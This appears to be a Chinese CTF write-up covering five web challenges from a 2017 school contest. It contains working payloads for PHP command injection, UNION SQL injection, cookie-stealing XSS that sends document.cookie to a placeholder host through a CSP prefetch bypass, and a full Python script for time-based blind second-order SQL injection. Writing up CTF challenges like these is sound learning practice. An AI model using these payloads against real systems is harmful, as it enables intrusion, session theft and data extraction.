---
title: 2017 某校赛 Writeup
tags: [write-up]
date: 2017-06-25 07:45
---
这次校赛的时候只做了web题 ，。。。。
<!-- more -->
<link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css">
<div class="markdown_views"><p>这次校赛的时候只做了web题 ，。。。。</p>
<h1 id="web">WEB</h1>
<h2 id="0x01-admin">0x01 admin</h2>
<p>直接扫描出来robots.txt <br>
访问得到 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170625070204493?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
访问admin <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170625070311518?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
注意把cookie 的admin项改成1</br></img></br></br></img></br></br></p>
<h2 id="0x02-babyphp">0x02 babyphp</h2>
<p>浏览网页，发现了猫腻 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170625070521337?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></p>
<p>本题有.git泄露可以直接下到源码，一开始以为是版本控制，但发现只有本地git只有一个版本 <br>
接下来下到了源码 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170625070721926?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
一道很明显的执行命令的题目，只需要闭合引号和括号即可 <br>
最后构造<code>page='.system("ls").'home</code> <br>
命令执行一番还是发现无果 <br>
最后利用git diff比较分支查到了flag <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170625071528214?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></br></br></br></br></img></br></br></p>
<h2 id="0x03-inject">0x03 inject</h2>
<p>一道简单的注入题目 <br>
搜索目录找到了备份文件</br></p>
<pre class="prettyprint"><code class=" hljs xml"><span class="php"><span class="hljs-preprocessor">&lt;?php</span>
<span class="hljs-keyword">require</span>(<span class="hljs-string">"config.php"</span>);
<span class="hljs-variable">$table</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'table'</span>]?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'table'</span>]:<span class="hljs-string">"test"</span>;
<span class="hljs-variable">$table</span> = Filter(<span class="hljs-variable">$table</span>);
mysqli_query(<span class="hljs-variable">$mysqli</span>,<span class="hljs-string">"desc `secret_{$table}`"</span>) <span class="hljs-keyword">or</span> Hacker();
<span class="hljs-variable">$sql</span> = <span class="hljs-string">"select 'flag{xxx}' from secret_{$table}"</span>;
<span class="hljs-variable">$ret</span> = sql_query(<span class="hljs-variable">$sql</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$ret</span>[<span class="hljs-number">0</span>];
<span class="hljs-preprocessor">?&gt;</span></span></code></pre>
<p>首先<code>mysqli_query($mysqli,"desc</code>secret_{$table}<code>") or Hacker();</code>要执行成功 <br>
其次是注入语句 <br>
我们可以构造table=test<code></code>union select     ···的语句查询 <br>
第一次我构造了 <br>
test` ` where 1=2 union select 1 from secret_flag  <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170625072115709?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></br></br></br></br></p>
<p>后来才知道D是查询为空，只能换种写法 <br>
test` `  union select 1 from secret_flag limit 1,1 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170625072429407?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></br></p>
<p>有了显示位下面就是正常的注入流程。 <br>
利用test` `union select flagUwillNeverKnow from secret_flag limit 1,1 <br>
最后得到flag</br></br></p>
<h2 id="0x04-babyxss">0x04 babyxss</h2>
<p>一道简单的xss题目，一开始一直犯sb，经提示，恍然大悟。</p>
<h3 id="0x1-验证码">0x1 验证码</h3>
<p>验证码就不说啥了，经常遇见这里再贴上脚本</p>
<pre class="prettyprint"><code class=" hljs python"><span class="hljs-keyword">import</span> random
<span class="hljs-keyword">import</span> string
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span><span class="hljs-params">(str)</span>:</span>
    <span class="hljs-keyword">import</span> hashlib
    m = hashlib.md5()
    m.update(str)
    <span class="hljs-keyword">return</span> m.hexdigest()
<span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
    string = <span class="hljs-string">''</span>
    s = string.join(random.sample(<span class="hljs-string">'qwertyuiopasdfghjklzxcvbnm1234567890'</span>,<span class="hljs-number">4</span>))
    <span class="hljs-keyword">if</span> md5(s)[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == <span class="hljs-string">'58a204'</span>:
        <span class="hljs-keyword">print</span> s
        <span class="hljs-keyword">break</span> </code></pre>
<h3 id="0x2-绕过csp">0x2 绕过csp</h3>
<p>现在绕过csp的方法很简单，也很固定利用chrome的prefetch属性进行预加载绕过。 <br>
观察发现此题是严格csp限制 <br>
<code>default-src 'self'; script-src 'self' ;</code> <br>
只能加载同源脚本，一般XSS是支持内联脚本的。 <br>
那么现在又有个问题，我们怎么能加载同源可控脚本呢？</br></br></br></br></p>
<h3 id="0x3-上传同源可控脚本">0x3 上传同源可控脚本</h3>
<p>这里我首先发送标签 <br>
<code>&lt;link rel="prefetch" href="http://xxxx/XSS/?c=[cookie]"&gt;</code> <br>
在我XSS平台上收到了一个带有referer字段的http包 <br>
里面有admin网址，以及我发送的留言信息。</br></br></br></p>
<pre class="prettyprint"><code class=" hljs avrasm">
var n0t = document<span class="hljs-preprocessor">.createElement</span>(<span class="hljs-string">"link"</span>)<span class="hljs-comment">;</span>
n0t<span class="hljs-preprocessor">.setAttribute</span>(<span class="hljs-string">"rel"</span>, <span class="hljs-string">"prefetch"</span>)<span class="hljs-comment">;</span>
n0t<span class="hljs-preprocessor">.setAttribute</span>(<span class="hljs-string">"href"</span>, <span class="hljs-string">"http://xxxx/?a="</span>+document<span class="hljs-preprocessor">.cookie</span>)<span class="hljs-comment">;</span>
document<span class="hljs-preprocessor">.head</span><span class="hljs-preprocessor">.appendChild</span>(n0t)<span class="hljs-comment">;</span>

&lt;link rel=<span class="hljs-string">"prefetch"</span> href=<span class="hljs-string">"http://xxxxx/?c=[cookie]"</span>&gt;</code></pre>
<p>这点我已开始没想到····，耽误了好长时间</p>
<h3 id="0x4-利用组合姿势xss">0x4 利用组合姿势XSS</h3>
<p>有了同源可控脚本我们再次上传一个</p>
<pre class="prettyprint"><code class=" hljs xml"><span class="hljs-tag">&lt;<span class="hljs-title">script</span> <span class="hljs-attribute">src</span>=<span class="hljs-value">"http://39.108.192.25:5004/4dmIn.php?id=eef85d17855c8aca3c9df877511cfe17"</span>&gt;</span><span class="javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-title">script</span>&gt;</span></code></pre>
<p>就可以把我们的脚本当做js脚本引用执行</p>
<p>还有个坑js脚本里面有标签的时候，会解析报错。 <br>
这里把他注释掉,就可以了 这个是我脑洞出来的，不过很有效果，因为html不执行//</br></p>
<p>最后收到一发XSS信息 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170625074459255?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></p>
<h2 id="0x05-register">0x05 register</h2>
<p>这道题给了提示之后还是没有做出来，主要是卡在了不知道country字段，影响了什么。这才是二次注入的关键点，最后得知是影响了时间，瞬间有了思路，但还是不知道有什么表这里利用猜测的办法猜到数据表是users <br>
于是就可以利用时间的不同进行盲注 <br>
下面贴出盲注脚本</br></br></p>
<pre class="prettyprint"><code class=" hljs python"><span class="hljs-comment"># coding:utf-8</span>
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> ceil
<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">global</span> string
string = <span class="hljs-string">''</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dichotomie</span><span class="hljs-params">(l,r,i)</span>:</span><span class="hljs-comment">#利用二分法查找</span>

    mid = (l+r)/<span class="hljs-number">2</span>
    <span class="hljs-comment"># print "l and r ,mid:",l,r,mid</span>
    <span class="hljs-keyword">if</span> l == r:
        <span class="hljs-keyword">global</span> string
        string += chr(r)
        <span class="hljs-keyword">print</span> string
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>
    <span class="hljs-keyword">if</span> charge(mid,i):<span class="hljs-comment">#&lt;=</span>
        <span class="hljs-comment">#print 0</span>
        dichotomie(l,mid,i)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-comment">#print 1</span>
        dichotomie(int(ceil((l+r)*<span class="hljs-number">1.0</span>/<span class="hljs-number">2</span>)),r,i)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">charge</span><span class="hljs-params">(mid,i)</span>:</span>
    payload = <span class="hljs-string">"'or(select(ascii(substr(group_concat(c),{}))&lt;={}) from (select 1,2,3`c`,4,5 union(select*from(users)))`b`) #"</span>.format(i,mid)
    login = requests.session()
    username = <span class="hljs-string">"4ct10n"</span>+str(randint(<span class="hljs-number">1</span>,<span class="hljs-number">10000000</span>))
    data = {
    <span class="hljs-string">'username'</span>:username,
    <span class="hljs-string">'password'</span>:<span class="hljs-string">'1'</span>,
    <span class="hljs-string">'address'</span>:<span class="hljs-string">'1'</span>,
    <span class="hljs-string">'country'</span>:payload
    }
    login.post(<span class="hljs-string">'http://39.108.192.25:5005/register.php'</span>,data=data)
    data = {
    <span class="hljs-string">'username'</span>:username,
    <span class="hljs-string">'password'</span>:<span class="hljs-string">'1'</span>
    }
    login.post(<span class="hljs-string">'http://39.108.192.25:5005/login.php'</span>,data=data)
    res = login.get(<span class="hljs-string">'http://39.108.192.25:5005/index.php?page=info'</span>)
    string = res.content
    r = re.findall(<span class="hljs-string">'2017-07-01 (.*)&lt;/em&gt;'</span>,string)[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]
    <span class="hljs-comment"># print r</span>
    <span class="hljs-keyword">if</span> r == <span class="hljs-string">'05'</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>
    <span class="hljs-comment"># print data</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):
    dichotomie(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>,i)
<span class="hljs-keyword">print</span> string</code></pre></div>